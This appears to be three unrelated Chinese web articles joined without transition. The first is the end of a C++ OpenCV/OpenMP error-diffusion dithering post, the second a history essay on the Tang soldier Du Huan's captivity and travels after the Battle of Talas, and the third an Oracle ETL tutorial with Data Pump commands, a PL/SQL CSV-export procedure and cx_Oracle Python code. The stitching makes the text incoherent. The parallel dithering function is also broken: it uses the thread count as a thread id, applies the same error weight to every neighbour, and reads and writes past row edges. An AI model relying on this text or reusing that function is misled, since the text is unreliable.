#pragma comment(lib,"opencv_imgproc2410d.lib")     

using namespace std;  
using namespace cv;  

void error_diffusion(unsigned int width,
					 unsigned int height,
					 unsigned short **InputImage,
					 unsigned short **OutputImage
	)

{

	for (unsigned int i = 0;i < height-1; i++)
	{
		for(unsigned int j = 1;j < width-1; j++)
		{
			//计算输出像素的值
			if (InputImage[i][j]<128)
			{
				OutputImage[i][j] = 0;
			}
			else{ OutputImage[i][j] = 1;}

			//计算误差值
			int err = InputImage[i][j] - 255*OutputImage[i][j];
			//扩散误差
			int v;
			v=(int)InputImage[i  ][j+1];v+=err*7/16;if (v>255) v=255; if (v<0) v=0;InputImage[i  ][j+1]=(unsigned short)v;
			v=(int)InputImage[i+1][j-1];v+=err*3/16;if (v>255) v=255; if (v<0) v=0;InputImage[i+1][j-1]=(unsigned short)v;
			v=(int)InputImage[i+1][j  ];v+=err*5/16;if (v>255) v=255; if (v<0) v=0;InputImage[i+1][j  ]=(unsigned short)v;
			v=(int)InputImage[i+1][j+1];v+=err*1/16;if (v>255) v=255; if (v<0) v=0;InputImage[i+1][j+1]=(unsigned short)v;
		}
	}
}

int row = 288;
//int col = width;

void error_diffusion_omp(unsigned int width,
	unsigned int height,
	unsigned short **InputImage,
	unsigned short **OutputImage
	)

{
	int cpu_num = omp_get_num_procs();//cpu数
	 
	int col = width;
#pragma omp parallel private(row , col)//并行域
	{
		int thread_id = omp_get_num_threads();//每个线程的线程号
		Sleep(20*thread_id);//根据线程短延迟
	
#pragma omp for
		for (int i = 0; i<(height/cpu_num);i++)
		{
			 row  = row*cpu_num + thread_id;

			for ( col = 0;col<width;col++)
			{
				//计算输出像素的值
				if (InputImage[i][col]<128)
				{
					OutputImage[i][col] = 0;
				}
				else{ OutputImage[i][col] = 1;}

				//计算误差值
				int err = InputImage[i][col] - 255*OutputImage[i][col];
				//扩散误差
				InputImage[i][col+1] += err * 7/16;
				InputImage[i+1][col-1] += err * 7/16;
				InputImage[i+1][col] += err * 7/16;
				InputImage[i+1][col+1] += err * 7/16;

			}
		}

	

	}
}



int _tmain(int argc, _TCHAR* argv[])
{
	string str_name = "result.pgm";  
	

	Mat image_src = imread(str_name,0);
	imshow("original image",image_src);

	unsigned short **InputImage = new unsigned short *[image_src.rows];
	for (int i = 0;i<image_src.rows;i++)
	{
		InputImage[i] = new unsigned short [image_src.cols];
	}
	unsigned short **OutputImage = new unsigned short *[image_src.rows];
	for (int i = 0;i<image_src.rows;i++)
	{
		OutputImage[i] = new unsigned short [image_src.cols];
	}

	cout<<image_src.rows;
	cout<<image_src.cols;
	Mat image_dst(image_src.rows,image_src.cols,CV_8U);

	for(int y = 0;y < image_src.rows;y++)  
	{  
		uchar *ptr= image_src.ptr<uchar>(y); 
		
		for(int x = 0;x < image_src.cols;x++)  
		{  
			
			InputImage[y][x] = ptr[x];
			OutputImage[y][x] = 0;
			
		}  
	} 


	error_diffusion(image_src.cols,image_src.rows,InputImage,OutputImage);
	//error_diffusion_omp(image_src.cols,image_src.rows,InputImage,OutputImage);

	for(int y = 0;y < image_src.rows;y++)  
	{  
		uchar *ptr= image_dst.ptr<uchar>(y); 

		for(int x = 0;x < image_src.cols;x++)  
		{  
			if (OutputImage[y][x]==1)
			{
				ptr[x] = 255;
			}
			else
				ptr[x] = 0;

		}  
	} 
	imshow("error diffusion",image_dst);
	imwrite("result.bmp",image_dst);

	waitKey(0);


	return 0;
}


效果图：



参考文献：

SHAMEEM AKHTER(孟). 多核程序设计技术--通过软件多线程提升性能[M]. 电子工业, 2007.
张春柳, 李嘉, 熊琭. 基于OpenMP实现的误差扩散算法[J]. 软件产业与工程, 2015(1):44-48.




 






一个西安人, 去了巴格达, 耶路撒冷和北非, 回国后写了游记. 这挺正常的. 但是这件事发生在1300年前的唐朝, 就显得有些神奇了. 花了点时间整理了下这个唐朝的长安人杜环在海外的10年经历.公元751年, 当时世界上最大的两个帝国, 大唐与阿拉伯阿拔斯帝国(史称黑衣大食), 在大唐西域怛( da,二声)罗斯进行了一场战役. 怛罗斯, 位于现在哈萨克斯坦Talas附近. 大唐军队的统帅是镇西节度使高仙芝, 率领约2万唐军, 以及约5万番军(西域诸国军队), 共7万人. 阿拉伯军队的统帅是当时阿拉伯帝国忽逻姗省的最高长官, 艾布·穆斯林.战役的结果是大唐军队战败, 高仙芝仅率数千唐军逃回大唐. 我国史书几乎不提怛罗斯之战, 这是一场不光彩的失败, 但也确实不是伤筋动骨的失败. 阿拉伯史书倒是有更详细的记载: 杀五万唐番联军, 俘虏两万人. 唐长安人杜环, 就是被俘唐军中的一员. 杜环在怛罗斯战役10年后, 即公元762年, 坐商船在广州登陆, 重新回到大唐领土. 是的, 他在哈萨克斯坦被俘, 在广州的码头回国.回国后, 杜环把他十年的见闻写成一本书<经行记>, 杜佑是杜环家族的长辈, 在编撰的《通典》里, 收录了《经行记》里的一部分内容, 共1500多字. 这些内容, 主要是对大唐以西诸国的介绍, 不包含杜环的个人事迹.《经行记》原书, 现在已经散佚, 没人找得到了. 不仅书找不到, 杜环详细的生卒年, 我们现在也无法知道. 只有杜佑在《通典》里对杜环的介绍:族子杜环, 随镇西节度使高仙芝西征, 天宝十载至西海. 宝应初, 因贾商船舶, 自广州而回. -- 杜佑《通典》土库曼斯坦的新年《经行记》里写了一个叫末禄国的地方. 末禄国, 是现在的土库曼斯坦马雷市. 当时是阿拉伯帝国东方行省忽逻姗的首府, 也就是怛罗斯战役中阿拉伯军队统帅艾布`穆斯林的大本营.杜环对末禄国出产的水果蔬菜, 牲畜特产, 以及宗教习俗, 都有很详细的描写:在亚梅国西南七百余里. 胡姓末者, 兹土人也. 其城方十五里, 用铁为城门, 城中有盐池, 又有两所佛寺, 其境东西百四十里, 南北百八十里, 村栅相接, 树木交映, 四面合匝, 总是流沙, 南有大河, 流入其境, 分渠数百, 灌溉一州.其土沃饶, 其人洁净. 墙宇高厚, 市鄽平正, 木既雕刻, 土亦绘画. 又有细软叠布, 羔羊皮裘, 估其上者, 值银钱数百. 果有红桃，白㮈, 遏白黄李, 瓜大者名寻支, 十余人飡一辄足. 越瓜长四尺以上, 菜有蔓菁, 萝卜, 长葱, 颗葱, 芸台, 胡苽, 葛蓝, 军达, 茴香, 英薤, 瓠芦, 尤多葡萄. 又有黄牛, 野马, 水鸭, 石鸡,以上描写, 是末禄国当时的位置与物产. 下面这段是末禄国的习俗与宗教. 其中的 西海, 是指地中海.其俗以五月为岁, 每岁以画缸相献. 有打球节, 秋千节, 其大食东道使镇此. 从此至西海以来, 大食波斯, 参杂居止, 其俗礼天, 不食自死肉及宿肉, 以香油涂发.所有关于末禄国的说明, 都没有杜环个人的经历, 他与他所在的唐军部队, 是如何辗转从怛罗斯来到末禄? 他们在那里待了多久?后来的学者只能从 其俗以五月为岁推断出一些信息. 末禄当时采用伊斯兰历, 伊历每年的1月1日与大唐当时使用的历法, 都有相当的差别. 也就是说, 伊历纪年的1月1日, 并不总是大唐历法的5月. 这就类似于现在的农历大年初一, 有时候是在公历1月下旬, 有时候是在公历2月中旬. 经过推算, 公元755年至757年这三年, 伊历的1月1日, 位于大唐历法的5月. 所以, 杜环在755年至757年之间, 很有可能还只是停留在土库曼斯坦一带. 这种依靠其它方法推测杜环行程的事情, 后面还有好几个....这个时候他如果回国, 也只能重走来时的路, 往东返回.杜环在末禄国度过了新年(途中红色标记)北非叛乱阿拉伯帝国并不太平, 在公元755年, 忽逻姗行省的总督, 怛罗斯战役击败唐军的艾布·穆斯林, 在权力斗争中被杀. 当时的国王, 叫阿浦恭弗(也叫曼苏尔), 经过几次人员任命后, 最后让他的弟弟作忽逻姗总督.同时, 在阿拉伯帝国西方, 有一个叫摩邻的地方发生叛乱. 摩邻国(Maghrib), 位于今天的北非突尼斯和利比亚一带, 阿浦恭弗为了解决叛乱, 从忽逻姗调集3万军队, 前往平叛. 杜环所在的唐军部队, 应该就是被编入平叛军队, 一起前往摩邻国平叛, 给了杜环游历中亚和北非的机会.摩邻国, 其首府位于今突尼斯凯鲁万(图中红点标记), 杜环随军前往平叛目前杜佑收录的《经行记》里, 并没有记载杜环离开末禄前往摩邻的原因, 对这场平叛战争更是只字未提, 所有关于摩邻国的记述就是下面这段话:又去摩邻国, 在秧萨罗国西南, 渡大碛, 行二千里至其国. 其人黑, 其俗犷, 少米麦, 无草木, 马食干鱼, 人餐鹘莽. 鹘莽, 即波斯枣也, 瘴疬特甚.杜环和阿拉伯军中的其他士兵应该在北非吃了不少苦头, 杜环来自遥远的大唐, 其他阿拉伯士兵的家乡, 也是中亚土库曼斯坦一带, 到了北非, 没有米麦, 马只能吃鱼干, 人要靠突尼斯椰枣充饥. 杜环记的 瘴疬特甚可能是水土不服导致生病, 也可能是军队中发生了一场瘟疫.根据阿拉伯史书记载, 摩邻平叛结束的时间是公元761年8月左右. 公元757年时, 杜环应该还在中亚的土库曼斯坦一带(书中所写末禄国), 末禄国距离摩邻国的陆地直线距离, 达4000多千米. 杜环在757年至761年这4年, 从土库曼斯坦马雷市出发, 横穿今天的两河流域, 叙利亚, 埃及, 最终到达突尼斯.两河流域的繁华, 以及大唐老乡杜环从末禄国随军出发, 先是往西到达了阿拉伯帝国的腹地, 杜环在《经行记》中将其记载为 亚俱罗(Aqual音译), 也就是两河流域, 这里是人类文明的发祥地之一. 杜环对亚俱罗的记载篇幅较长, 下面是第一段:大食, 一名亚俱罗, 其大食王号暮门, 都此处.其士女环伟长大, 衣裳鲜洁, 容止闲丽. 女子出门, 必拥蔽其面. 无问贵贱, 一日五时礼天, 食肉作斋, 以杀生为功德.系银带, 佩银刀, 断饮酒, 忌音乐. 人相争者, 不至殴击.杜环对亚俱罗中人们宗教信仰的记述, 也是中国古代对伊斯兰教最早最准确的描述. 其中, 杜环说大食王号 暮门, 这里的 暮门, 是 Amiral-Mu'mimin 的省略音译, 意为"信仰者的领袖". 《旧唐书·大食传》, 将该词音译为 噉密莫末腻.同时, 杜环还记录了亚俱罗的繁华.法唯从宽, 葬唯从俭, 郛廓之内, 里闬之中, 土地所生, 无物不有, 四方辐辏, 万货丰贱, 锦绣珠贝, 满于市肆. 驼马驴骡, 充于街巷, 刻石蜜为卢舍, 有似中国宝舆. 每至节日, 将献贵人, 琉璃器皿, 鍮石瓶钵, 盖不可数算.粳米白面, 不异中华. 其果有楄桃, 又千年枣, 其蔓菁根大如斗而圆, 味甚美, 余菜亦与诸国同.绫绢机杼, 金银匠, 画匠, 汉匠起作画者, 京兆人樊淑, 刘泚, 织络者, 河东人乐阫, 吕礼.在都城繁华的介绍里, 杜环记下了他在都城里遇到的四名大唐老乡: 京兆(长安)人樊淑, 刘泚, 河东人乐阫, 吕礼. 河东是今天的山西省运城市, 位于西安以东约200千米. 按照行军速度推算, 杜环到达两河流域的时间, 应该是公元758年, 此时距离怛罗斯战役已经7年. 在距大唐遥远的阿拉伯帝国腹地, 在被俘7年后, 杜环(应该还有其他唐军战俘)见到了四名大唐老乡. 他们肯定聊了很多. 杜环是长安人, 樊淑和刘泚也是长安人, 他们在聊天的时候, 或许还能聊出一些共同认识的人, 聊一些共同经过的事, 比如某年的新年, 长安里有什么热闹的集会.我每次想到杜环特意记下樊淑, 刘泚, 乐阫和吕礼四个人的名字, 杜佑也将这四人收录进《通典》, 就挺感慨的. 杜佑收录的《经行记》里, 没有击败大唐军队的阿拉伯军统帅艾布·穆斯林的名字, 没有阿拉伯王阿浦恭弗的名字, 甚至没有提摩邻平叛这件事, 但是专门记下了四个大唐工匠. 可能杜佑和杜环, 是觉得在遥远异国的大唐工匠们, 应该留下他们的名字, 让后人们知道这件事.《经行记》里记录大食王定都于亚俱罗. 不过亚俱罗是阿拉伯帝国的一处行省,是一大片区域, 杜环这段对都城的记述, 就像是一个外国人到了大唐后记录说 “大唐皇帝定都关中”. 那杜环所说的都城到底是现在的哪个城市? 这也不能怪杜环, 当杜环到达两河流域时, 阿拉伯帝国阿拔斯王朝还处在比较动荡的时期, 当时的阿拉伯王的宫殿, 几经变化, 没有固定, 杜环哪年到的两河流域, 我们都只是推测, 他到达两河流域时, 阿拉伯王如果搬了家, 估计也会让杜环很糊涂吧, 所以杜环干脆就简单记录, 只说都城就在亚俱罗行省那片地区.可能只有从全本《经行记》里才能找到都城位置的确切线索, 换句话说, 我们可能再也无法确知了. 但是学者宋岘经过一番考证和推论, 将杜环与四名大唐老乡相遇的地点, 定在了巴格达. 嗯, 就是现在的伊拉克首都, 巴格达.杜环记录的大食首都, (推测为)现在的巴格达(图中红色标记)推论为巴格达的理由是, 杜环在亚俱罗停留的时间, 据推测应该在公元758年-760年之间, 另外根据阿拉伯文献的记录, 巴格达城在758年开始兴建. 且在修建时, 阿拉伯王身边已经有了忽逻姗军队作为近卫军. 忽逻姗省首府, 就是杜环待了很久的末禄国, 杜环等大唐士兵被收编入的, 就是阿拉伯帝国忽逻姗军队. 此外, 为了修建巴格达城, 阿拉伯王阿浦恭弗从阿拉伯帝国境内征召了10万工匠, 樊淑等人, 应该是随这十万工匠到达巴格达的. 而他们之前在阿拉伯帝国的什么地方, 杜环走后, 他们有没有离开巴格达, 回到长安和河东道, 我们也就永远不知道了.杜环要继续随军往西前往北非, 樊淑等可能也为他饯了行. 如果是在长安饯行, 要折柳相赠, 不清楚巴格达当时有没有柳树, 如果没有柳树的话, 想来杜环也只能与樊师傅他们互道一声珍重了. 在辛弃疾的想象中, 即将回到汉长安城的苏武和被匈奴俘虏的将军李陵在北海惜别, 为此写了千古名句:向河梁, 回头万里, 故人长绝. -- 《贺新郎·别茂嘉十二弟》(辛弃疾)这次, 是被俘虏的杜环会再回到长安.耶路撒冷杜环继续往西, 经过了一个叫 秧萨罗的地方. 目前保留下来的《经行记》, 对秧萨罗并没有像末禄, 亚俱罗, 摩邻那样详细的说明, 只是在说摩邻国时, 提到 :又去摩邻国, 在秧萨罗国西南, 渡大碛, 行二千里至其国这个不起眼的"秧萨罗", 就是著名的三大宗教圣地, 耶路撒冷. 当时阿拉伯语为 "Urishilam", 杜环音译为 "秧萨罗". 杜环在描述大食亚俱罗的风俗时, 记载了下面的阿拉伯王礼拜的情景.又有礼堂, 容数万人. 每七日, 王出礼拜, 登高座为众说法曰: "人生甚难, 天道不易, 奸非劫窃, 细行谩言, 安己危人, 欺贫虐贱, 有一于此, 罪莫大焉. 凡有征战, 为敌所戮, 必得生天, 杀其敌人, 获福无量". 率土禀化, 从之如流.其中透露了与之前末禄国 五月为岁 类似的线索, 那就是杜环身处一个可以容纳数万人的礼堂(清真寺), 在听阿拉伯王为士兵们讲道. 杜佑把这段描述放在了杜环对亚俱罗地区的描述里, 但是当时亚俱罗地区, 没有可容纳数万人的清真寺. 因此关于这个清真寺在什么地方, 有两个推论:白寿彝考证此清真寺是位于麦加的“克尔白”清真寺.宋岘考证此清真寺为耶路撒冷的阿萨克清真寺.其中, 宋岘推论讲道发生在耶路撒冷, 是因为: 耶路撒冷是杜环明确提到的地点, 杜环所在军队是经耶路撒冷继续往西前往摩邻国, 且阿拉伯王的讲道对象是士兵, 似乎是战前动员, 因此耶路撒冷阿萨克清真寺是比较合理的推论耶路撒冷(图中红色标记)另外, 应该就是在耶路撒冷附近, 杜环真正看到了他在《经行记》中提到了多次的“西海” -- 地中海, 在整个中国历史上, 能够走到地中海的人是屈指可数的. 杜环, 以及同行的其他唐军士兵, 也算是完成了一个很特殊的成就吧.耶路撒冷继续往西, 杜环所在军队到达了叛乱发生地, 摩邻国, 并于公元761年8月平定叛乱. 之后, 杜环踏上了回国的商船.海路回国现存的《经行记》没有记载摩邻国平叛之后, 杜环是何时, 通过何种方式脱离军队, 又是在何处登上回大唐的商船. 只有杜佑在通典中简单的介绍:(杜环)宝应初, 因贾商船舶, 自广州而回宝应初年, 是公元762年4月至公元763年1月. 摩邻平叛成功, 是公元761年8月, 所以可以推测, 杜环应该是在平叛成功后就启程返回大唐, 而没有再往东折返回巴格达. 杜环应该是在红海上的某个港口, 踏上了商船. 从突尼斯到红海的港口, 杜环要经过富庶的埃及尼罗河流域. 合理地脑补一下, 杜环可能也见到了宏伟的金字塔了吧, 或许还有狮身人面像.不过, 我没有找到较准确的杜环登船港口的考证.红海至印度洋的出海口(图中红色标记)后记下图是我非常粗糙地标记出来的, 杜环的十年经行路线. 从长安募兵, 前往西域, 经历怛罗斯之战被俘后, 随阿拉伯军队抵达末禄国. 在滞留末禄数年后, 又随军队前往两河流域, 经耶路撒冷并最终到达北非摩邻国, 平定当地叛乱. 之后在红海港口搭乘商船, 经斯里兰卡, 马六甲海峡, 抵达广州港口, 并返回长安城.图画地真的非常粗糙. 我甚至没有准确标记出几个重要地点的经纬度. 其中红色的线路, 是杜环前往北非的线路, 绿色的线路, 是杜环海路回到广州的路线.推测出的杜环十年的游历路线(手绘, 很粗糙)需要注意的是, 因为《经行记》只保留了1500多字, 而杜环十年间的行程路线, 以及途经各地在今天的具体位置, 都是经过多名学者考证各种史料推论得出的. 《经行记》中还提到了另外一些国家和文化习俗, 其中明显有部分是杜环没有到访过, 只是听说的国家, 也有一些国家我们至今无法确知它们是今天的哪个地区.即便是本文所写的摩邻国, 在《经行记》中也没有明确表明杜环确实去过, 且去摩邻国是为了平叛, 只能依据杜环的详细描述推测他去过摩邻国, 并结合阿拉伯史料中的摩邻平叛事件, 推测杜环是随军队前往.即便如此, 杜环的经历, 也已经远超同时代人的认知, 在我通过各种资料了解杜环的行程路线时, 感到很是震撼, 心里一遍又一遍重复一个不太雅观的词, 以w和c开头的. 即使放在今天, 让一个普通人通过现代交通工具完成这趟旅途, 面对沿途各国的语言, 饮食, 习俗, 宗教的差异, 也要作周全的准备和心理建设, 旅途中可能还会不止一次地想要赶快回家.而杜环是以战俘的身份被迫开始这段十年的旅程, 期间还要参加战斗. 以当时的医疗水平, 在战场负伤或者染上比较严重的疾病, 都可能危及生命. 杜环能够成功回到大唐长安城, 已经算是一个很大的奇迹了.只是杜环写的《经行记》, 没有这么好的运气, 到现在只保留了1500字, 就像1960年岑仲勉先生说杜佑没有将《经行记》全本纳入《通典》, 真的是 “天壤见一憾事”.参考文献《经行记笺注》(张一纯著), 华文出版社, 2017年8月第一版. (张一纯在1960年完成《经行记笺注》, 这本书是2017年再版, 并添加下面几篇更新的研究成果)《杜环游历大食国之路线考》 宋岘, 1997-11-01, 明清之际中国和西方国家的文化交流——中国中外关系史学会第六次学术讨论会论文集. (收录于参考文献1中)《唐代中国文化与巴格达城的兴建——(唐)杜环 <经行记> 新证之一》宋岘, 1998-01, 海交史研究. (收录于参考文献1中)《亚俱罗考》 宋岘 (收录于参考文献1中)《杜环与耶路撒冷》 宋岘 (收录于参考文献1中)《从怛罗斯战役说到伊斯兰教之最早的华文记录》 白寿彝 1936年 (收录于参考文献1中)










文章大纲大数据ETL 系列文章简介ETL 简介1. oracle数据泵 导入导出实战1.1 数据库创建1.2. installs Oracle1.3 export / import data from oracle2.  将数据库表导出成 CSV, 并批量上传至 AWS2.1 export all table to CSV3. python 与oracle 交互4. oracle table-视图 windows 批处理 导出4.1 使用win32 脚本调用sqlplus 导出视图4.2 使用python 执行视图导出参考

大数据ETL 系列文章简介
本系列文章主要针对ETL大数据处理这一典型场景，基于python语言使用Oracle、aws、Elastic search 、Spark 相关组件进行一些基本的数据导入导出实战，如：

oracle使用数据泵impdp进行导入操作。
aws使用awscli进行上传下载操作。
本地文件上传至aws es
spark dataframe录入ElasticSearch

等典型数据ETL功能的探索。
系列文章：
1.大数据ETL实践探索（1）---- python 与oracle数据库导入导出
2.大数据ETL实践探索（2）---- python 与aws 交互
3.大数据ETL实践探索（3）---- pyspark 之大数据ETL利器
4.大数据ETL实践探索（4）---- 之 搜索神器elastic search
5.使用python对数据库，云平台，oracle，aws，es导入导出实战
6.aws ec2 配置ftp----使用vsftp
7.浅谈pandas，pyspark 的大数据ETL实践经验

ETL 简介
ETL，是英文 Extract-Transform-Load 的缩写，用来描述将数据从来源端经过抽取（extract）、交互转换（transform）、加载（load）至目的端的过程。
之前有一段时间一直在使用python 与oracle 进行交互，具体内容参见：
windows下python3 使用cx_Oracle，xlrd插件进行excel数据清洗录入
可以说使用python 不但能够在后期的数据分析进行相当多的工作，而且可以针对前面大数据的相关组件进行一个有效的整合。在一个初创型的公司来讲，分析团队和数据团队可以有效结合，进行代码复用，并高效运转。

1. oracle数据泵 导入导出实战
1.1 数据库创建
本文主要使用最新版本的oracle 12c，如果创建oracle数据库时候使用了数据库容器（CDB）承载多个可插拔数据库（PDB）的模式，那么数据库的用户名需要用c##开头，使用数据泵进行操作 的时候也有一些不同：
在CDB中，只能创建以c##或C##开头的用户，如果不加c##，则会提示错误“ORA-65096：公用用户名或角色名无效”,只有在PDB数据库中才能创建我们习惯性命名的用户，oracle称之为Local User,前者称之为Common User。
创建的时候不要勾选：

https://www.cnblogs.com/xqzt/p/5034261.html
https://www.cnblogs.com/fanyongbin/p/5699482.html

1.2. installs Oracle
Download and install Oracle 12C,
Http://www.oracle.com/technetwork/database/enterprise-edition/downloads/index.html
Under windows10, use sqlplus to log in
you should first

set oracle_sid=orcl

Sqlplus /nolog

conn /as SYSDBA

Creating a user
Syntax [creating the user]:
create user username identified by password [that is the password];

E.g.
Create user [username] identified by [password];

Default tablespace [tablespacename]

Temporary tablespace temp;

Grant DBA to username;

.
由于全库导入的时候oracle_home和之前的数据库发生了改变，所以原来数据库的表空间需要提前建立。可以根据导出日志或者导入日志的报错，查看原来数据库中到底有那些表空间。特别注意有关视图和索引的表空间和用户也需要提起建立好。当然如果你只要数据的话就不太影像了。基本上使用表空间就可以全部导入。
Create table space :
E.g
Create tablespace xxx datafile'f:\xxx.dbf'size 200M AUTOEXTEND on;


1.3 export / import data from oracle
从oracle库中导出 数据可以使用oracle数据泵程序，全库导出实例如下：

Expdp username/password FULL=y DUMPFILE=dpump_dir1:full1%U.dmp, dpump_dir2:full2%U.dmp

FILESIZE=2G PARALLEL=3 LOGFILE=dpump_dir1:expfull.log JOB_NAME=job


以下命令的导入并不是全库导入，如果需要全库导入的话，由于oracle_home 的改变，需要提前建立好用户和表空间，以及索引的表空间，视图的用户等
command as follow:
Impdp username/password@orcl full=y directory=dir_yiliao dumpfile=full1%U.dmp remap_schema=username_old:username_new exclude=GRANT remap_tablespace='(t1:tempt1, t2:tempt2) '  tablespaces=tempt1,temp2

以下两种导入方式只能二选一：

full=y
tablespaces=tempt1,temp2

整体说明
https://www.2cto.com/database/201605/508212.html

2.  将数据库表导出成 CSV, 并批量上传至 AWS
2.1 export all table to CSV
使用oracle函数 utl_file  进行快速导入导出（一分钟300万条的量级），这个比spool快多啦
CREATE OR REPLACE PROCEDURE SQL_TO_CSV
(
 P_QUERY IN VARCHAR2, -- PLSQL文
 P_DIR IN VARCHAR2, -- 导出的文件放置目录
 P_FILENAME IN VARCHAR2 -- CSV名
 )
 IS
  L_OUTPUT UTL_FILE.FILE_TYPE;
  L_THECURSOR INTEGER DEFAULT DBMS_SQL.OPEN_CURSOR;
  L_COLUMNVALUE VARCHAR2(4000);
  L_STATUS INTEGER;
  L_COLCNT NUMBER := 0;
  L_SEPARATOR VARCHAR2(1);
  L_DESCTBL DBMS_SQL.DESC_TAB;
  P_MAX_LINESIZE NUMBER := 32000;
BEGIN
  --OPEN FILE
  L_OUTPUT := UTL_FILE.FOPEN(P_DIR, P_FILENAME, 'W', P_MAX_LINESIZE);
  --DEFINE DATE FORMAT
  EXECUTE IMMEDIATE 'ALTER SESSION SET NLS_DATE_FORMAT=''YYYY-MM-DD HH24:MI:SS''';
  --OPEN CURSOR
  DBMS_SQL.PARSE(L_THECURSOR, P_QUERY, DBMS_SQL.NATIVE);
  DBMS_SQL.DESCRIBE_COLUMNS(L_THECURSOR, L_COLCNT, L_DESCTBL);
  --DUMP TABLE COLUMN NAME
  FOR I IN 1 .. L_COLCNT LOOP
    UTL_FILE.PUT(L_OUTPUT,L_SEPARATOR || '"' || L_DESCTBL(I).COL_NAME || '"'); --输出表字段
    DBMS_SQL.DEFINE_COLUMN(L_THECURSOR, I, L_COLUMNVALUE, 4000);
    L_SEPARATOR := ',';
  END LOOP;
  UTL_FILE.NEW_LINE(L_OUTPUT); --输出表字段
  --EXECUTE THE QUERY STATEMENT
  L_STATUS := DBMS_SQL.EXECUTE(L_THECURSOR);
 
  --DUMP TABLE COLUMN VALUE
  WHILE (DBMS_SQL.FETCH_ROWS(L_THECURSOR) > 0) LOOP
    L_SEPARATOR := '';
    FOR I IN 1 .. L_COLCNT LOOP
      DBMS_SQL.COLUMN_VALUE(L_THECURSOR, I, L_COLUMNVALUE);
      UTL_FILE.PUT(L_OUTPUT,
                  L_SEPARATOR || '"' ||
                  TRIM(BOTH ' ' FROM REPLACE(L_COLUMNVALUE, '"', '""')) || '"');
      L_SEPARATOR := ',';
    END LOOP;
    UTL_FILE.NEW_LINE(L_OUTPUT);
  END LOOP;
  --CLOSE CURSOR
  DBMS_SQL.CLOSE_CURSOR(L_THECURSOR);
  --CLOSE FILE
  UTL_FILE.FCLOSE(L_OUTPUT);
EXCEPTION
  WHEN OTHERS THEN
    RAISE;
END;
 
/


创建数据库目录
sql>create or replace directory OUT_PATH as 'D:\';

运行以下sql
---- 导出单个表
SELECT 'EXEC sql_to_csv(''select * from ' ||T.TABLE_NAME ||''',''OUT_PATH''' || ',''ODS_MDS.' || T.TABLE_NAME ||'.csv'');' FROM user_TABLES T where t.TABLE_NAME='表名'

---- 导出行数大于0 的表
SELECT 'EXEC sql_to_csv(''select * from ' ||T.TABLE_NAME ||''',''OUT_PATH''' || ',''' || T.TABLE_NAME ||'.csv'');' FROM user_TABLES T where  T.num_rows >1


得到以下的批量sql，导出来，生成.sql脚本,在命令行中执行即可.
EXEC sql_to_csv('select * from table1','OUT_PATH','table1.csv');
EXEC sql_to_csv('select * from table2','OUT_PATH','table2.csv');

For reference, the links are as follows
Https://blog.csdn.net/huangzhijie3918/article/details/72732816

3. python 与oracle 交互
cx_oracle  的安装
windows10，redhat6.5下python3.5.2使用cx_Oracle链接oracle
其实主要的要点是，不管是windows 平台还是linux 平台，首要任务是安装好oracle client

4. oracle table-视图 windows 批处理 导出
4.1 使用win32 脚本调用sqlplus 导出视图
输入年月等信息，拼接字符串导出表, 下面 的脚本可以循环接受输入
@echo off
:begin
::年份
set input_year=
set /p input_year=Please input year :
::月份
set input_month=
set /p input_month=Please input month :

::字符串前缀
set prefix=ex_vw_
::字符串拼接

set "table_name=%prefix%%input_year%%input_month%"

echo Your input table_name:%table_name%
echo Your input time:%input_year%-%input_month%

::sqlplus 执行sql脚本 后带参数
sqlplus username/password@ip/instanceNname @createtable.sql %table_name% %input_year%-%input_month%



rem pause>null

goto begin

以下sql脚本为createtable.sql，接受两个参数，写做：&1 ，&2 …如果多个参数可以依次写下去。

drop table &1;

create table &1 as select * from some_table_view where incur_date_from = to_date('&2-01','yyyy-mm-dd');

Insert into &1 select * from some_table_view where incur_date_from = to_date('&2-02','yyyy-mm-dd');

commit;
quit;

后来发现一个问题，比如上面的第2小节的存储过程 SQL_TO_CSV，死活没法成功执行，只好安装cx_oracle ,用python 导出了，代码如下。
4.2 使用python 执行视图导出
主要逻辑是，按照月份 ，执行视图生成这个月每天的数据插入到表中，当一个月的数据执行完毕，将这个月份表导出。
类似这种流程化的东西，python果然还是利器
# -*- coding:utf-8 -*-
"""@author:season@file:export_view.py@time:2018/5/211:19"""

import cx_Oracle
import calendar

########################链接数据库相关######################################

def getConnOracle(username,password,ip,service_name):
    try:
        conn = cx_Oracle.connect(username+'/'+password+'@'+ip+'/'+service_name)  # 连接数据库
        return conn
    except Exception:
        print(Exception)
#######################进行数据批量插入#######################


def insertOracle(conn,year,month,day):

    yearandmonth = year + month

    table_name ='ex_vw_'+ yearandmonth
    cursor = conn.cursor()
##创建表之前先删除表
    try:
        str_drop_table = '''drop table ''' + table_name
        cursor.execute(str_drop_table)
    except cx_Oracle.DatabaseError as msg:
        print(msg)

    try:
#create table and insert
        str_create_table = '''create table ''' + table_name+ ''' as select * from EXPORT where date_from = to_date(' '''+ year + '-'+ month + '''-01','yyyy-mm-dd')'''
        print(str_create_table)
        cursor.execute(str_create_table)

        for i in range(2,day):
            if i < 10:
                str_incert =  '''Insert into ''' + table_name +''' select * from EXPORT where date_from = to_date(' '''+ year+'-'+month+'-'+str(0)+str(i)+'''','yyyy-mm-dd')'''
            else:
                str_incert = '''Insert into ''' + table_name + ''' select * from EXPORT where date_from = to_date(' '''+ year+'-'+month+'-'+ str(i)+'''','yyyy-mm-dd')'''
            print(str_incert)
            cursor.execute(str_incert)
            conn.commit()

        conn.commit()

#export big_table
        str_QUERY  = 'select * from ex_vw_'+ yearandmonth
        str_DIR = 'OUT_PATH'
        str_FILENAME  = 'EXPORT'+yearandmonth+'.csv'

        cursor.callproc('SQL_TO_CSV', [str_QUERY,str_DIR, str_FILENAME])

    except cx_Oracle.DatabaseError as msg:
        print(msg)


#导出数据后drop table
    try:
        str_drop_table = '''drop table ''' + table_name
        print(str_drop_table)
        cursor.execute(str_drop_table)
    except cx_Oracle.DatabaseError as msg:
        print(msg)

    cursor.close()


def main():
    username = 'xxx'
    password = 'xxx'
    ip = '127.0.0.1'
    service_name = 'orcl'
    #获取数据库链接
    conn = getConnOracle(username,password,ip,service_name)

    monthlist = ['06','05','04','03','02','01']
    daylist = [30,31,30,31,28,31]
    for i in range(0,len(monthlist)):
        insertOracle(conn,'2018',monthlist[i],daylist[i]+1)




    conn.close()

if __name__ == '__main__':
    main()


参考
OS.ENVIRON详解
python编码
再次强烈推荐，精通oracle+python系列：官方文档
http://www.oracle.com/technetwork/cn/articles/dsl/mastering-oracle-python-1391323-zhs.html
离线版本下载链接：
http://download.csdn.net/detail/wangyaninglm/9815726











